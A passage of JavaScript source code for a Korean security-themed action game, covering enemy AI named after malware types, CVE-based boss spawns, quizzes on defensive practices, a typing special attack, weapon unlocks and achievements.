  learn({ kind: 'zero', id: 'zero:0day', data: { name: '제로데이(0-day)', cve: '미공개', cvss: '-', product: '모든 소프트웨어', summary: '제조사가 알기 전이거나 패치가 나오기 전의 취약점. 공개 당일(0일)부터 악용된다.', fix: '심층 방어·최소 권한·이상 행위 탐지(EDR)·가상 패치(WAF)로 피해를 줄인다.', quiz: { q: '제로데이 공격에 가장 현실적인 대응은?', choices: ['패치가 나올 때까지 기다린다', '심층 방어와 이상 행위 탐지', '백신 하나면 충분하다'], answer: 1, explain: '패치가 없으니 여러 겹의 방어와 탐지·대응(EDR, 세그멘테이션, 최소권한)으로 피해를 줄입니다.' } } });
  game.winT = 2.6;
}

// ───────────────────────── 적 AI ─────────────────────────
const PR = 22;
function updateEnemy(e, dt) {
  if (e.dead) return;
  if (e.flash > 0) e.flash -= dt;
  if (e.z > 0 || e.vz > 0) {
    e.vz -= 1900 * dt; e.z += e.vz * dt;
    if (e.z <= 0) { e.z = 0; if (e.vz < -400) { dust(e.x, e.y, 3); e.stun = Math.max(e.stun, 0.25); } e.vz = 0; }
  }
  e.x += e.kbx * dt; e.y += e.kby * dt;
  const f = Math.exp(-dt * 7); e.kbx *= f; e.kby *= f;
  e.x = clamp(e.x, 20, WORLD.w - 20); e.y = clamp(e.y, 20, WORLD.h - 20);
  if (e.def.segs) { const tl = e.trail; if (!tl.length || Math.hypot(tl[0].x - e.x, tl[0].y - e.y) > 5) { tl.unshift({ x: e.x, y: e.y }); if (tl.length > e.def.segs * 3 + 1) tl.pop(); } }
  if (e.groggyT > 0) { e.groggyT -= dt; e.windup = 0; e.slam = null; e.chargeT = 0; return; }
  if (e.stun > 0) { e.stun -= dt; if (!e.def.big) { e.windup = 0; e.chargeT = 0; } if (!e.def.big) return; }
  if (e.z > 0) return;
  e.atkCd -= dt;
  const dx = player.x - e.x, dy = player.y - e.y, d = Math.hypot(dx, dy) || 1;
  const ux = dx / d, uy = dy / d;
  const reach = e.r + PR + e.def.reach;
  const move = (sx, sy, sp) => { e.x += sx * sp * dt; e.y += sy * sp * dt; e.heading = Math.atan2(sy, sx); };

  switch (e.def.ai) {
    case 'melee': {
      if (e.windup > 0) { e.windup -= dt; if (e.windup <= 0) { if (d < reach + 8) damagePlayer(e.dmg, e.x, e.y); e.atkCd = rand(1.1, 2.0); } return; }
      if (d < reach - 4 && e.atkCd <= 0) { e.windup = e.def.windup; return; }
      if (d > reach - 8) move(ux, uy, e.spd * (d > 900 ? 1.6 : 1));
      break;
    }
    case 'ranged': {
      if (e.windup > 0) {
        e.windup -= dt;
        if (e.windup <= 0) { const a = Math.atan2(dy, dx); game.bullets.push({ x: e.x, y: e.y, vx: Math.cos(a) * 330, vy: Math.sin(a) * 330, r: 8, dmg: e.dmg, life: 3, color: '#4dd0e1' }); e.atkCd = rand(2.2, 3.4); }
        return;
      }
      if (d > 330) move(ux, uy, e.spd * (d > 900 ? 1.6 : 1));
      else if (d < 220) move(-ux, -uy, e.spd * 0.8);
      else move(-uy, ux, e.spd * 0.4 * (e.seed > 50 ? 1 : -1));
      if (d < 420 && e.atkCd <= 0) e.windup = e.def.windup;
      break;
    }
    case 'charger': {
      if (e.chargeT > 0) {
        e.chargeT -= dt; e.x += e.cdx * 620 * dt; e.y += e.cdy * 620 * dt;
        if (!e.hitOnce && d < e.r + PR + 6) { e.hitOnce = true; damagePlayer(e.dmg, e.x, e.y); }
        if (Math.random() < 0.5) dust(e.x, e.y, 1);
        return;
      }
      if (e.windup > 0) { e.windup -= dt; if (e.windup <= 0) { e.chargeT = 0.42; e.cdx = ux; e.cdy = uy; e.hitOnce = false; e.atkCd = rand(2.5, 3.5); } return; }
      if (d < 320 && e.atkCd <= 0) { e.windup = e.def.windup; return; }
      move(ux, uy, e.spd * (d > 900 ? 1.8 : 1));
      break;
    }
    case 'officer': updateOfficer(e, dt, d, ux, uy, reach, move); break;
    case 'boss': updateBoss(e, dt, d, ux, uy, reach, move); break;
  }
}
function updateOfficer(e, dt, d, ux, uy, reach, move) {
  // 거점관리자: 플레이어가 거점에서 멀면 귀환
  if (e.base && Math.hypot(player.x - e.base.x, player.y - e.base.y) > e.base.r + 380) {
    const bx = e.base.x - e.x, by = e.base.y - e.y, bd = Math.hypot(bx, by);
    if (bd > 30) move(bx / bd, by / bd, e.spd * 0.8);
    e.windup = 0; e.slam = null; return;
  }
  if (e.windup > 0) {
    e.windup -= dt;
    if (e.windup <= 0) {
      if (e.slam) {
        const R = e.slam.r;
        ring(e.x, e.y, 10, R, '#ff5252', 0.35, 10); addShake(8); audio.boom(0.7); dust(e.x, e.y, 10);
        if (Math.hypot(player.x - e.x, player.y - e.y) < R + PR) damagePlayer(e.dmg * 1.3, e.x, e.y);
        e.slam = null;
      } else if (d < reach + 14) damagePlayer(e.dmg, e.x, e.y);
      e.atkCd = rand(1.2, 2.0);
    }
    return;
  }
  if (e.atkCd <= 0 && d < 260 && Math.random() < 0.35) { e.slam = { r: e.type === 'officer' ? 190 : 150 }; e.windup = 0.85; game.tele.push({ x: e.x, y: e.y, r: e.slam.r, t: 0, dur: 0.85, owner: e }); return; }
  if (d < reach - 4 && e.atkCd <= 0) { e.windup = e.def.windup; return; }
  if (d > reach - 10) move(ux, uy, e.spd * (d > 900 ? 1.7 : 1));
}
function updateBoss(e, dt, d, ux, uy, reach, move) {
  if (e.phase === 1 && e.hp < e.maxhp * 0.5) {
    e.phase = 2; e.spd *= 1.3; banner('제로데이 2단계', (CT.boss && CT.boss.phase2) || '익스플로잇 체인 가동!!', '#ff1744', 2.4); audio.alarm(); screenFlash('#ff0040', 0.5);
    for (let i = 0; i < 24; i++) { const a = i / 24 * TAU; const m = makeEnemy(pick(['bug', 'virus', 'worm']), e.x + Math.cos(a) * 200, e.y + Math.sin(a) * 200); m.stun = 0.5; }
  }
  e.patT -= dt;
  const pats = e.phase === 1 ? ['chase', 'slam', 'radial', 'summon'] : ['chase', 'slam', 'spiral', 'dash', 'radial', 'summon'];
  const cur = pats[e.pat % pats.length];
  switch (cur) {
    case 'chase': if (d > reach) move(ux, uy, e.spd); else if (e.atkCd <= 0) { damagePlayer(e.dmg * 0.6, e.x, e.y); e.atkCd = 1; } break;
    case 'slam':
      if (!e.slamSet) { e.slamSet = true; e.patT = 1.1; game.tele.push({ x: player.x, y: player.y, r: 230, t: 0, dur: 1.0, owner: e, boss: true }); e.slamX = player.x; e.slamY = player.y; }
      if (e.patT < 0.1 && !e.slamDone) {
        e.slamDone = true; e.x = lerp(e.x, e.slamX, 0.7); e.y = lerp(e.y, e.slamY, 0.7);
        ring(e.slamX, e.slamY, 20, 260, '#ff1744', 0.45, 16); addShake(16); audio.boom(1.2); dust(e.slamX, e.slamY, 18);
        if (Math.hypot(player.x - e.slamX, player.y - e.slamY) < 230 + PR) damagePlayer(e.dmg * 1.4, e.slamX, e.slamY);
      }
      break;
    case 'radial':
      e.radT = (e.radT || 0) - dt;
      if (e.radT <= 0) { e.radT = 0.55; const n = e.phase === 1 ? 20 : 28, off = Math.random(); for (let i = 0; i < n; i++) { const a = (i + off) / n * TAU; game.bullets.push({ x: e.x, y: e.y, vx: Math.cos(a) * 280, vy: Math.sin(a) * 280, r: 10, dmg: 12, life: 4, color: '#ff4081' }); } audio.tone('square', 300, 120, 0.15, 0.1); }
      break;
    case 'spiral':
      e.spT = (e.spT || 0) - dt; e.spA = (e.spA || 0) + dt * 2.6;
      if (e.spT <= 0) { e.spT = 0.07; for (let k = 0; k < 3; k++) { const a = e.spA + k * TAU / 3; game.bullets.push({ x: e.x, y: e.y, vx: Math.cos(a) * 300, vy: Math.sin(a) * 300, r: 9, dmg: 10, life: 4, color: '#ffab40' }); } }
      break;
    case 'dash':
      if (!e.dashSet) { e.dashSet = true; e.patT = 1.3; e.cdx = ux; e.cdy = uy; e.dashGo = 0.75; game.tele.push({ line: true, x: e.x, y: e.y, ang: Math.atan2(uy, ux), len: 700, t: 0, dur: 0.75, owner: e }); }
      e.dashGo -= dt;
      if (e.dashGo < 0 && e.dashGo > -0.45) { e.x += e.cdx * 1500 * dt; e.y += e.cdy * 1500 * dt; dust(e.x, e.y, 2); if (d < e.r + PR + 10) damagePlayer(e.dmg, e.x, e.y); }
      break;
    case 'summon':
      if (!e.sumSet) { e.sumSet = true; e.patT = 1.2; for (let i = 0; i < Math.min(16, 360 - enemyCount()); i++) { const a = Math.random() * TAU; const m = makeEnemy(pick(['bug', 'worm', 'virus', 'botnet', 'rootkit']), e.x + Math.cos(a) * 260, e.y + Math.sin(a) * 260); m.stun = 0.6; } ring(e.x, e.y, 30, 300, '#ff4081', 0.6, 10); }
      break;
  }
  if (e.patT <= 0) { e.pat++; e.patT = cur === 'chase' ? 2.2 : 3; e.slamSet = e.slamDone = e.dashSet = e.sumSet = false; }
}

// ───────────────────────── 스폰 디렉터 ─────────────────────────
function pickType() {
  if (game.mission && game.mission.stage >= 0 && MISSION.stages[game.mission.stage].action === 'kill' && Math.random() < 0.7) return pick(['botnet', 'rootkit', 'trojan']);
  const t = game.time, a = countAlly();
  const w = [
    ['bug', 42], ['worm', 16], ['virus', 16],
    ['trojan', t > 30 || a >= 1 ? 10 : 0], ['botnet', t > 50 || a >= 1 ? 8 : 0],
    ['rootkit', t > 80 || a >= 2 ? 9 : 0], ['ransom', t > 110 || a >= 3 ? 4 + a : 0],
  ];
  let s = 0; for (const [, v] of w) s += v;
  let r = Math.random() * s;
  for (const [k, v] of w) { r -= v; if (r <= 0) return k; }
  return 'bug';
}
function spawnDirector(dt) {
  game.spawnT -= dt;
  const enemyBases = game.bases.filter((b) => b.owner === 'enemy');
  const target = Math.min(360, game.diff.alive + countAlly() * 10 + (game.loop - 1) * 25) * (IS_MOBILE ? 0.6 : 1);
  if (game.spawnT <= 0 && enemyCount() < target) {
    game.spawnT = 0.35;
    const type = pickType();
    const n = type === 'bug' ? randi(9, 16) : type === 'ransom' ? randi(1, 3) : randi(5, 10);
    // 화면 밖, 적 거점 방향 위주
    let ang;
    if (enemyBases.length && Math.random() < 0.7) { const b = pick(enemyBases); ang = Math.atan2(b.y - player.y, b.x - player.x) + rand(-0.9, 0.9); }
    else ang = Math.random() * TAU;
    const viewR = viewRadius() + 90;
    let cx = player.x + Math.cos(ang) * viewR, cy = player.y + Math.sin(ang) * viewR;
    if (enemyBases.length && Math.random() < 0.25) { const b = pick(enemyBases); cx = b.x + rand(-120, 120); cy = b.y + rand(-120, 120); }
    for (let i = 0; i < n; i++) makeEnemy(type, cx + rand(-90, 90), cy + rand(-90, 90));
  }
  // 직장 스트레스 몹 · 보안 점검 요청서
  game.officeT -= dt; if (game.officeT <= 0) { game.officeT = rand(40, 55); spawnOffice(game.diff.id === 'easy' ? 1 : 2); }
  game.inspectT -= dt; if (game.inspectT <= 0) { game.inspectT = quizFreq().inspect; spawnInspect(); }
  // 적장 (실존 CVE) — 훈련 모드에선 없음
  if (!game.boss && !game.mission) {
    game.officerTimer -= dt;
    if (game.officerTimer <= 0 && !game.enemies.some((e) => e.type === 'officer')) {
      game.officerTimer = game.diff.id === 'hard' ? 55 : 70;
      const isDaily = game.officerIdx === 0;
      if (!game.cveOrder) game.cveOrder = buildCveOrder();
      const info = cveList()[game.cveOrder[game.officerIdx % game.cveOrder.length]]; game.officerIdx++;
      const a = Math.random() * TAU;
      const o = makeEnemy('officer', player.x + Math.cos(a) * 650, player.y + Math.sin(a) * 650);
      o.info = info; o.name = info.name; o.title = `${isDaily ? '★오늘의 CVE · ' : ''}${info.cve} · CVSS ${info.cvss}`; o.daily = isDaily;
      o.hp = o.maxhp = ETYPES.officer.hp * game.diff.ehp * (1 + (game.loop - 1) * 0.4) * (1 + game.officerIdx * 0.08);
      audio.alarm();
      banner(`적장 출현: ${info.name}`, info.kev ? `🆕 CISA KEV ${info.month} 신규 · 실제 악용 확인 · ${info.cve} (CVSS ${info.cvss})` : `${info.cve} (CVSS ${info.cvss}) · ${info.product}`, info.kev ? '#ffab40' : '#ff5252', 3);
      msg(`[경보] ${info.name} — ${info.summary}`, '#ff8a80');
    }
  }
  // 무한 모드: 재점령
  if (game.diff.endless && game.loopT > 0) {
    game.loopT -= dt;
    if (game.loopT <= 0) {
      game.loop++;
      for (const b of game.bases) { b.owner = 'enemy'; spawnKeeper(b); }
      audio.alarm();
      banner(`야근 ${game.loop}회차`, '새로운 CVE가 공개되어 모든 거점이 다시 뚫렸습니다', '#ff5252', 3);
    }
  }
}

// ───────────────────────── 업데이트 ─────────────────────────
const grid = new Map();
const GRID = 72;
// 정사각 기둥(한 변 2r)과 원(반지름 rr) 충돌 → 밀어내기
function pushOut(e, o, rr) {
  const cx = clamp(e.x, o.x - o.r, o.x + o.r), cy = clamp(e.y, o.y - o.r, o.y + o.r);
  const dx = e.x - cx, dy = e.y - cy, d2 = dx * dx + dy * dy;
  if (d2 >= rr * rr) return;
  if (d2 > 0.01) { const d = Math.sqrt(d2); e.x += (dx / d) * (rr - d); e.y += (dy / d) * (rr - d); }
  else { // 중심이 기둥 안: 가장 가까운 변으로
    const ex = e.x - o.x, ey = e.y - o.y;
    if (Math.abs(ex) > Math.abs(ey)) e.x = o.x + Math.sign(ex || 1) * (o.r + rr); else e.y = o.y + Math.sign(ey || 1) * (o.r + rr);
  }
}
function separate() {
  for (const o of game.obstacles) pushOut(player, o, PR);
  grid.clear();
  const es = game.enemies;
  for (let i = 0; i < es.length; i++) {
    const e = es[i]; const k = ((e.x / GRID) | 0) * 1000 + ((e.y / GRID) | 0);
    let cell = grid.get(k); if (!cell) grid.set(k, (cell = [])); cell.push(e);
  }
  for (const e of es) {
    const cx = (e.x / GRID) | 0, cy = (e.y / GRID) | 0;
    for (let ox = -1; ox <= 1; ox++) for (let oy = -1; oy <= 1; oy++) {
      const cell = grid.get((cx + ox) * 1000 + cy + oy); if (!cell) continue;
      for (const o of cell) {
        if (o === e) continue;
        const dx = e.x - o.x, dy = e.y - o.y, md = e.r + o.r;
        const d2 = dx * dx + dy * dy;
        if (d2 < md * md && d2 > 0.01) {
          const d = Math.sqrt(d2), push = (md - d) * 0.5;
          const we = e.def.big ? 0.1 : 1;
          e.x += (dx / d) * push * we; e.y += (dy / d) * push * we;
        }
      }
    }
    for (const o of game.obstacles) pushOut(e, o, e.r);
    // 플레이어와 겹침 방지
    const dx = e.x - player.x, dy = e.y - player.y, md = e.r + PR, d2 = dx * dx + dy * dy;
    if (d2 < md * md && d2 > 0.01) { const d = Math.sqrt(d2); const push = md - d; if (e.def.big) { player.x -= (dx / d) * push * 0.5; player.y -= (dy / d) * push * 0.5; } else { e.x += (dx / d) * push; e.y += (dy / d) * push; } }
  }
}

function update(dt) {
  game.titleT += dt;
  if (imeWarnT > 0) imeWarnT -= dt;
  if (game.state === 'title') { updateTitle(dt); pressed = {}; return; }
  if (game.state === 'pause') { if (wasPressed('Escape', 'KeyP', 'Enter')) game.state = 'play'; if (wasPressed('KeyQ')) { game.state = 'title'; audio.stopBgm(); } pressed = {}; return; }
  if (game.state === 'result') { updateResult(dt); pressed = {}; return; }

  // ── play ──
  if (wasPressed('KeyM')) audio.setMuted(!settings.muted);
  if (wasPressed('KeyV') && window.R3D) {
    const order = ['chase', 'fps', 'tps', '2d'];
    settings.view = order[(order.indexOf(settings.view || 'chase') + 1) % order.length];
    window.R3D.enabled = settings.view !== '2d';
    if (settings.view !== '2d') window.R3D.mode = settings.view;
    if (!['fps', 'chase'].includes(settings.view) && document.pointerLockElement) document.exitPointerLock();
    store.set('settings', settings);
    msg(`[화면] ${{ chase: '3인칭(등 뒤)', fps: '1인칭', tps: '쿼터뷰', '2d': '2D 탑뷰' }[settings.view]} 시점`, '#b0bec5');
  }
  if (game.overlay) { updateOverlay(dt); pressed = {}; updateUiTimers(dt); return; }
  if (wasPressed('Escape', 'KeyP')) { game.state = 'pause'; pressed = {}; return; }
  if (!game.typing) for (let i = 0; i < WEAPONS.length; i++) if (wasPressed('Digit' + (i + 1))) equipWeapon(i);

  updateUiTimers(dt);
  if (game.typing) updateTyping(dt);

  if (game.hitstop > 0) { game.hitstop -= dt; return; } // 입력은 버퍼에 유지 → 정지가 풀리면 바로 실행
  let ts = game.slowT > 0 ? 0.3 : 1;
  if (game.slowT > 0) game.slowT -= dt;
  if (game.typing) ts = 0.06;
  const sdt = dt * ts;

  game.frameHits = 0; game.framePow = 0; game.frameHs = 0;
  if (!game.typing) updatePlayer(sdt);
  for (const e of game.enemies) updateEnemy(e, sdt);
  separate();
  // 타격 결과 → 사운드·히트스톱 (프레임당 1회로 합산)
  if (game.frameHits > 0) {
    audio.hit(game.framePow + Math.min(1, game.frameHits / 12));
    addHitstop(game.frameHs * (game.frameHits > 6 ? 1.25 : 1));
    if (game.frameHits >= 4 && Math.random() < 0.08) floatText(player.x, player.y - 75, pick(CT.playerShouts), '#b2ebf2', 18, { life: 0.7, bold: true });
  }
  game.enemies = game.enemies.filter((e) => !e.dead);

  // 웨이브(충격파)
  for (const w of game.waves) {
    w.x += w.vx * sdt; w.y += w.vy * sdt; w.life -= sdt;
    for (const e of game.enemies) {
      if (w.hit.has(e)) continue;
      if (Math.hypot(e.x - w.x, e.y - w.y) < w.r + e.r) { w.hit.add(e); hitEnemy(e, w.dmg, Math.cos(w.ang) * w.kb, Math.sin(w.ang) * w.kb, { heavy: true, launch: 420, hs: 0.02, power: 1.4 }); }
    }
    if (Math.random() < 0.8) sparks(w.x, w.y, 2, '#80d8ff', 200);
  }
  game.waves = game.waves.filter((w) => w.life > 0);
  // 적 탄
  for (const b of game.bullets) {
    b.x += b.vx * sdt; b.y += b.vy * sdt; b.life -= sdt;
    if (b.friendly) { for (const e of game.enemies) if (!e.dead && Math.hypot(e.x - b.x, e.y - b.y) < e.r + b.r) { hitEnemy(e, b.dmg, b.vx * 0.5, b.vy * 0.5, { heavy: true, power: 1 }); b.life = 0; break; } }
    else if (Math.hypot(b.x - player.x, b.y - player.y) < b.r + PR - 4) { b.life = 0; damagePlayer(b.dmg, b.x, b.y); }
  }
  game.bullets = game.bullets.filter((b) => b.life > 0);
  // 텔레그래프
  for (const t of game.tele) { t.t += sdt; if (t.owner && !t.owner.boss && t.owner.dead) t.t = t.dur; if (t.owner && !t.line && !t.boss) { t.x = t.owner.x; t.y = t.owner.y; } }
  game.tele = game.tele.filter((t) => t.t < t.dur);
  // 아이템
  for (const it of game.items) {
    it.t += sdt;
    const d = Math.hypot(player.x - it.x, player.y - it.y);
    if (d < 140) { it.x += (player.x - it.x) * Math.min(1, sdt * 8); it.y += (player.y - it.y) * Math.min(1, sdt * 8); }
    if (d < 36) {
      it.t = 999; audio.pickup();
      if (it.kind === 'coffee') { const h = player.maxhp * 0.18; player.hp = Math.min(player.maxhp, player.hp + h); floatText(player.x, player.y - 70, '☕ 커피 수혈 +' + Math.round(h), '#a1887f', 18, { important: true, bold: true }); }
      if (it.kind === 'energy') { player.musou = Math.min(100, player.musou + 45); floatText(player.x, player.y - 70, '⚡ 에너지드링크! 무쌍+', '#ffeb3b', 18, { important: true, bold: true }); }
      if (it.kind === 'gijo') activateGijo();
      if (it.kind === 'inspect') openBankQuiz();
      if (it.kind === 'backup' && game.mission) { game.mission.carrying = true; msg('[훈련] 백업 확보! 안전 금고(초록 표시)로 운반하세요', '#69f0ae'); }
      if (it.kind === 'patch') { player.patchT = 15; floatText(player.x, player.y - 70, '🛡 보안패치 적용! 공격력 UP', '#69f0ae', 18, { important: true, bold: true }); }
    }
  }
  game.items = game.items.filter((it) => it.t < itemLife(it));
  // 시체
  for (const c of game.corpses) { c.life -= sdt; c.x += c.vx * sdt; c.y += c.vy * sdt; c.vx *= Math.exp(-sdt * 2); c.vy *= Math.exp(-sdt * 2); c.vz -= 1600 * sdt; c.z = Math.max(0, c.z + c.vz * sdt); c.rot += c.vr * sdt; }
  game.corpses = game.corpses.filter((c) => c.life > 0);
  // 파티클 / 텍스트
  for (const p of game.particles) {
    p.life -= sdt;
    if (p.vx !== undefined) { const fr = Math.exp(-(p.drag || 0) * sdt); p.vx *= fr; p.vy *= fr; p.vy += (p.g || 0) * sdt; p.x += p.vx * sdt; p.y += p.vy * sdt; }
    if (p.vr) p.rot += p.vr * sdt;
  }
  game.particles = game.particles.filter((p) => p.life > 0);
  updateCubes(sdt);
  for (const t of game.texts) { t.life -= sdt; t.y += t.vy * sdt; t.x += t.vx * sdt; t.vy *= Math.exp(-sdt * 3); t.pop = Math.max(0, t.pop - sdt * 6); }
  game.texts = game.texts.filter((t) => t.life > 0);
  for (const b of game.bolts) b.life -= dt;
  game.bolts = game.bolts.filter((b) => b.life > 0);

  // 콤보 타이머
  if (game.comboT > 0) { game.comboT -= sdt; if (game.comboT <= 0) game.combo = 0; }
  spawnDirector(sdt);
  updateGijo(sdt);
  updateMission(sdt);
  if (game.mission && game.mission.clearSoon > 0) { game.mission.clearSoon -= sdt; if (game.mission.clearSoon <= 0) stageClear(); }
  game.achT -= dt; if (game.achT <= 0) { game.achT = 1; checkAchievements(); }
  if (touch.input && !game.typing && document.activeElement === touch.input) touch.input.blur();
  flushNewborn();
  game.time += sdt;
  // 진행 타이머 (일시정지·오버레이 중에는 멈춤)
  if (game.bossSpawnT > 0) { game.bossSpawnT -= dt; if (game.bossSpawnT <= 0 && !game.boss) spawnBoss(); }
  if (game.winT > 0) { game.winT -= dt; if (game.winT <= 0) { endGame(true); return; } }

  // 카메라
  const lead = player.state === 'move' ? 60 : 0;
  cam.x = lerp(cam.x, player.x + Math.cos(player.facing) * lead, Math.min(1, dt * 7));
  cam.y = lerp(cam.y, player.y + Math.sin(player.facing) * lead, Math.min(1, dt * 7));
  pressed = {};
}
function updateUiTimers(dt) {
  game.shake *= Math.exp(-dt * 10);
  game.sx = (Math.random() * 2 - 1) * game.shake; game.sy = (Math.random() * 2 - 1) * game.shake;
  game.flash = Math.max(0, game.flash - dt * 3);
  game.vignette = Math.max(0, game.vignette - dt * 1.5);
  game.zoomPunch *= Math.exp(-dt * 6);
  game.zoom = 1 + game.zoomPunch + (player.state === 'musou' ? 0.08 : 0);
  game.comboPop = Math.max(0, game.comboPop - dt * 5);
  for (const b of game.banners) b.t += dt;
  for (const a of game.achToasts) a.t += dt;
  game.achToasts = game.achToasts.filter((a) => a.t < 3.5);
  game.banners = game.banners.filter((b) => b.t < b.dur);
  for (const m of game.msgs) m.t += dt;
  if (game.cardToast) { game.cardToast.t += dt; if (game.cardToast.t > game.cardToast.dur) game.cardToast = null; }
}

// ───────────────────────── 타이핑 필살기 ─────────────────────────
function handleTypingKey(e) {
  const T = game.typing; if (!T) return;
  if (e.key === 'Process' || e.keyCode === 229) { imeWarnT = 3; return; }
  if (e.key === 'Escape') { player.term = 50; game.typing = null; if (touch.input) touch.input.blur(); msg('[터미널] 명령 취소 (게이지 50% 반환)', '#90a4ae'); return; }
  if (e.key === 'Enter') { if (T.idx >= T.cmd.length) executeTyping(1); else { audio.buzz(); T.shakeT = 0.2; } return; }
  if (e.key.length !== 1 || T.idx >= T.cmd.length) return;
  const want = T.cmd[T.idx];
  if (e.key.toLowerCase() === want.toLowerCase()) {
    T.idx++; audio.clack(T.idx === T.cmd.length);
    addShake(2.5);
    // 타이핑 1글자 = 근처 적에게 번개 한 방
    const tgt = nearestEnemy(player.x, player.y, 650);
    if (tgt) {
      game.bolts.push({ x1: player.x, y1: player.y, z1: 30, x2: tgt.x, y2: tgt.y, z2: tgt.z, life: 0.12, seed: Math.random() });
      hitEnemy(tgt, 38, rand(-150, 150), rand(-150, 150), { heavy: true, launch: 300, power: 0.7, noGauge: true });
    }
  } else {
    T.errors++; audio.buzz(); T.shakeT = 0.2; screenFlash('#ff1744', 0.12);
  }
}
function updateTyping(dt) {
  const T = game.typing;
  T.t += dt; T.shakeT = Math.max(0, T.shakeT - dt);
  if (T.t >= T.max) executeTyping(T.idx / T.cmd.length);
}
function executeTyping(ratio) {
  const T = game.typing; if (!T) return;
  game.typing = null;
  if (touch.input) touch.input.blur(); // 휴대폰 키보드 닫기
  const perfect = ratio >= 1 && T.errors === 0;
  if (perfect) game.typePerfect++;
  const mult = ratio * (perfect ? 1.5 : 1);
  if (T.mission) {
    if (ratio >= 1) { game.mission.typed = true; game.mission.clearSoon = 1.2; }
    else { msg('[훈련] 격리 명령이 완료되지 않았습니다 — 다시 입력하세요', '#ff8a80'); audio.wrong(); return; }
  }
  if (ratio <= 0.05) { msg('[터미널] 시간 초과 — 명령 실패', '#ff8a80'); audio.wrong(); return; }
  const R = viewRadius() + 60;
  for (const e of game.enemies) {
    const d = Math.hypot(e.x - player.x, e.y - player.y);
    if (d < R) { const a = Math.atan2(e.y - player.y, e.x - player.x); hitEnemy(e, 260 * mult, Math.cos(a) * 800, Math.sin(a) * 800, { heavy: true, launch: 900, power: 3, noGauge: true }); }
  }
  addHitstop(0.18); addShake(26); screenFlash('#00e5ff', 0.9); game.slowT = 0.7; game.zoomPunch = 0.15;
  audio.boom(2.2); keycapBurst(player.x, player.y, 24);
  ring(player.x, player.y, 20, R, '#00e5ff', 0.6, 24);
  banner(perfect ? '[ OK ] 위협 제거 완료 — PERFECT' : `[ OK ] 명령 실행 (${Math.round(ratio * 100)}%)`, `$ ${T.cmd}  →  ${T.desc}`, '#00e5ff', 3, 50);
  msg(`[터미널] ${T.cmd} — ${T.desc}`, '#80deea');
}

// ───────────────────────── 오버레이(도감 카드·퀴즈) ─────────────────────────
function updateOverlay(dt) {
  const ov = game.overlay; ov.t += dt;
  if (ov.phase === 'quiz') {
    if (ov.t < 0.35) return;
    for (let i = 0; i < 3; i++) if (wasPressed('Digit' + (i + 1), 'Numpad' + (i + 1))) { answerQuiz(i); return; }
  } else if (ov.phase === 'answer') {
    if (ov.t > 0.6 && wasPressed('Enter', 'Space', 'NumpadEnter')) { game.overlay = null; pressed = {}; }
  }
}

// ═════════════════════ 확장: 무기 · 업적 · 오늘의 CVE · 직장몹 · 보안점검 · 로그분석 · 침해사고 훈련 ═════════════════════
const stats = store.get('stats', { quizRight: 0, officeKo: 0, irClear: 0 });

// ── 무기: 도감을 모을수록 해금 (공부 = 강해짐) ──
const WEAPONS = [
  { id: 'keyboard', name: '거대 기계식 키보드', desc: '균형형 기본 무기', need: null, m: { range: 1, arc: 1, dmg: 1, speed: 1, kb: 1 } },
  { id: 'lan', name: '랜선 채찍', desc: '사거리 1.6배 · 빠름 · 좁은 각도', need: { kind: 'base', n: 2, text: 'OWASP 도감 2개' }, m: { range: 1.6, arc: 0.65, dmg: 0.85, speed: 1.2, kb: 0.8 } },
  { id: 'hammer', name: '서버랙 해머', desc: '느리지만 피해 2배 · 모든 공격이 강타', need: { kind: 'cve', n: 3, text: 'CVE 도감 3개' }, m: { range: 1.1, arc: 1, dmg: 2.0, speed: 0.72, kb: 1.6 }, heavy: true },
  { id: 'flail', name: '마우스 플레일', desc: '모든 약공격이 360° 회전베기', need: { kind: 'mal', n: 5, text: '위협 인텔 5개' }, m: { range: 1.1, arc: 1, dmg: 0.8, speed: 1, kb: 1.1 }, spin: true },
  { id: 'shield', name: '방화벽 방패', desc: '정면 피해 60% 감소 · 적 탄 반사', need: { kind: 'base', n: 6, text: 'OWASP 도감 6개 전부' }, m: { range: 0.95, arc: 1.1, dmg: 1.1, speed: 1, kb: 1.3 }, guard: 0.6, reflect: true },
  { id: 'gijo', name: 'GIJO 블레이드', desc: '전 성능 강화 · 게이지 2배 충전', need: { kind: 'all', n: 20, text: '도감 20개' }, m: { range: 1.3, arc: 1.15, dmg: 1.5, speed: 1.15, kb: 1.3 }, gauge: 2 },
];
function codexCount(kind) {
  const ks = Object.keys(codexSeen).filter((k) => !k.startsWith('zero'));
  return kind === 'all' ? ks.length : ks.filter((k) => k.startsWith(kind + ':')).length;
}
const isUnlocked = (w) => !w.need || codexCount(w.need.kind) >= w.need.n;
const unlockedSeen = store.get('weapons', ['keyboard']);
const curWeapon = () => WEAPONS.find((w) => w.id === settings.weapon && isUnlocked(w)) || WEAPONS[0];
function checkUnlocks() {
  for (const w of WEAPONS) if (isUnlocked(w) && !unlockedSeen.includes(w.id)) {
    unlockedSeen.push(w.id); store.set('weapons', unlockedSeen);
    if (game.state === 'play') { banner('새 무기 해금!', `${w.name} — ${w.desc}  (숫자키 ${WEAPONS.indexOf(w) + 1}로 장착)`, '#69f0ae', 3.4, 56); audio.levelup(); }
  }
  checkAchievements();
}
function equipWeapon(i) {
  const w = WEAPONS[i]; if (!w) return;
  if (!isUnlocked(w)) { msg(`[무기] ${w.name} 잠김 — ${w.need.text} 필요`, '#90a4ae'); audio.buzz(); return; }
  settings.weapon = w.id; store.set('settings', settings);
  msg(`[무기] ${w.name} 장착 — ${w.desc}`, '#69f0ae'); audio.clack(true);
}
function applyWeapon(a, kind) {
  const w = curWeapon(), m = w.m;
  if (a.range) a.range *= m.range;
  if (a.arc) a.arc = w.spin && kind === 'L' ? 360 : Math.min(360, a.arc * m.arc);
  a.dmg *= m.dmg; a.kb *= m.kb;
  for (const k of ['dur', 'a0', 'a1', 'cancel']) a[k] /= m.speed;
  if (a.tick) a.tick /= m.speed;
  if (w.heavy) { a.hs = (a.hs || 0) * 1.5; a.shake = (a.shake || 0) * 1.4; }
  return a;
}

// ── 업적 ──
const ACHS = [
  ['first', '첫 출근', '첫 위협 처치', () => game.ko >= 1],
  ['ko500', '오백 장애 처리', '한 판 500 KO', () => game.ko >= 500],
  ['ko1500', '일기당천', '한 판 1500 KO', () => game.ko >= 1500],
  ['combo100', '백연타', '100 HITS 콤보', () => game.maxCombo >= 100],
  ['combo300', '연타의 신', '300 HITS 콤보', () => game.maxCombo >= 300],
  ['perfect', '타자왕', '터미널 명령 퍼펙트 입력', () => game.typePerfect >= 1],
  ['quiz10', '공부하는 관제요원', '누적 퀴즈 정답 10', () => stats.quizRight >= 10],
